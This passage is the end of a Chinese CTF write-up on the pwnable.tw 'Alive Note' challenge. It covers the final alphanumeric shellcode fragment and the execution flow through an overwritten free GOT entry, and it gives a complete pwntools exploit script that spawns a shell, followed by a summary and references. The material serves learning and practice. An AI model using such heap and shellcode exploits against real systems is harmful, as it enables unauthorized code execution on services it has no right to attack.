<p>第六段:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6175574130364130</span><span class="p">)</span>
<span class="s1">'0A60AWua'</span>
</pre></div>
<p>PYjzZSu8<br/>
4F0A5Su8<br/>
11111111<br/>
X4340t9<br/>
XH0AFu6<br/>
0A60AWua</p>
<ol>
<li>做完这些过后，填充前面的，然后shellcode就行，位置0x38+7-0x8=0x37</li>
</ol>
<p>所以就是’a'*0x37 + asm(shellcraft.sh())</p>
<h4 data-content="1" id="ce426cf8969e7bf04d157a43769d4684">执行过程</h4>
<p>至于执行过程呢，free(offset),然后就开始执行free_got表里的shellcode，也就是offset处的shellcode，接着跳来跳去就完成了</p>
<p>还有就是没必要跟我一样挑难的来，网上好多大佬都是中间用三个堆块填充，这样跳转不用计算来计算去，那样好算点，我是为了复习汇编加理解原理搞复杂的</p>
<h4 data-content="1" id="e408ff8ad2739f6fe92ac5fcc3d3d5ab">exp</h4>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">host</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span> 
<span class="n">port</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="c1">#context.log_level = 'debug'</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s1">'./alive_note'</span>
<span class="c1"># Load it if has exe</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Elf can't be load"</span><span class="p">)</span>

<span class="c1"># load libc </span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
<span class="c1">#don't forget to change it</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span>                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">regex</span>                                   <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="n">regex</span><span class="p">)</span>
<span class="n">rp</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">lg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>                                  <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'</span><span class="se">\033</span><span class="s1">[1;31;40m</span><span class="si">%20s</span><span class="s1">--&gt;0x</span><span class="si">%x</span><span class="se">\033</span><span class="s1">[0m'</span><span class="o">%</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
<span class="n">ga</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">job</span><span class="o">=</span><span class="s2">""</span>                                  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">job</span><span class="p">)</span> <span class="k">if</span> <span class="n">local</span> <span class="k">else</span> <span class="mi">0</span>
<span class="n">ia</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># break on aim addr</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">PIE</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">PIE</span><span class="p">:</span>
        <span class="n">text_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"pmap {}| awk '{{print $1}}'"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">))</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">ga</span><span class="p">(</span><span class="s1">'b *{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="o">+</span><span class="n">addr</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ga</span><span class="p">(</span><span class="s2">"b *{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>

<span class="c1"># get_one_gadget</span>
<span class="k">def</span> <span class="nf">get_one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"one_gadget --raw "</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">))</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>
    <span class="c1"># Arch:     i386-32-little</span>
    <span class="c1"># RELRO:    Partial RELRO</span>
    <span class="c1"># Stack:    Canary found</span>
    <span class="c1"># NX:       NX disabled</span>
    <span class="c1"># PIE:      No PIE (0x8048000)</span>
    <span class="c1"># RWX:      Has RWX segments</span>

<span class="k">def</span> <span class="nf">fuzz</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">char</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>

<span class="n">List</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">122</span><span class="p">]</span>         
<span class="n">List</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">List</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">checkPayload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">List</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">checkPayload</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"payload is wrong"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">rce</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">rce</span><span class="p">:</span>
        <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">get_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>

    <span class="c1">#start here</span>
    <span class="sd">'''</span>
<span class="sd">    PYjzZSu8</span>
<span class="sd">    4F0A5Su8</span>
<span class="sd">    11111111</span>
<span class="sd">    X4340t9</span>
<span class="sd">    XH0AFu6</span>
<span class="sd">    0A60AWua</span>
<span class="sd">    '''</span>
    <span class="c1"># offset = free_got - heap</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x0804a014</span><span class="o">-</span><span class="mh">0x0804A080</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
    <span class="n">ga</span><span class="p">(</span><span class="s2">"b *0x080488DC</span><span class="se">\n</span><span class="s2"> c</span><span class="se">\n</span><span class="s2">n 4</span><span class="se">\n</span><span class="s2">delete</span><span class="se">\n</span><span class="s2">s</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="s1">'PYjzZSu8'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'4F0A5Su8'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'11111111'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s1">'X4340t9'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">'XH0AFu6'</span><span class="p">)</span>
    <span class="n">new</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">'0A60AWua'</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
    <span class="n">s</span><span class="p">(</span><span class="mh">0x37</span><span class="o">*</span><span class="s1">'a'</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
    <span class="c1">#ga()</span>

    <span class="n">ia</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>

    <span class="c1"># fuzz the input name</span>
    <span class="sd">'''</span>
<span class="sd">    List = []</span>
<span class="sd">    for i in range(0, 128):</span>
<span class="sd">        try:</span>
<span class="sd">            fuzz(chr(i))</span>
<span class="sd">            io.close()</span>
<span class="sd">            List.append(i)</span>
<span class="sd">        except Exception as e:</span>
<span class="sd">            print(e)</span>
<span class="sd">        finally:</span>
<span class="sd">            io = process(exe)</span>
<span class="sd">    print(List)</span>
<span class="sd">    '''</span>
    <span class="n">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,)</span>
</pre></div>
<h2 data-content="1" id="8408a9435dfce7284442a55d7a8a8147">总结</h2>
<ol>
<li>shellcode编写难度其实还是挺大的，最主要是数学计算问题，计算偏移跳转那些确实得非常精细</li>
<li>shellcode题目类型其实也不多，手写的难度大，在菜鸡比赛中应该比较少出现，大部分是那种工具生成的，毕竟手写汇编太耗时了?(师傅们几分钟写完，我等瑟瑟发抖)</li>
<li>shellcode链这种思路我还没编写过，这次学到了，大佬们tql</li>
<li>xor byte ptr[ecx+0x35],al 这种改int 0x80也是刚学到</li>
</ol>
<h2 data-content="1" id="1e90405f8e4dad94af34ce892c32ae7b">参考链接</h2>
<p><a href="https://github.com/DoubleLabyrinth/pwnable.tw/blob/master/Alive%20Note/solve.py" target="_blank">DoubleLabyrinth师傅</a><br/>
<a href="http://p4nda.top/2018/05/13/ciscn-ctf-2018/" target="_blank">p4nda师傅的博客(听过师傅好久了，没机会认识)</a></p>
</div>
</div>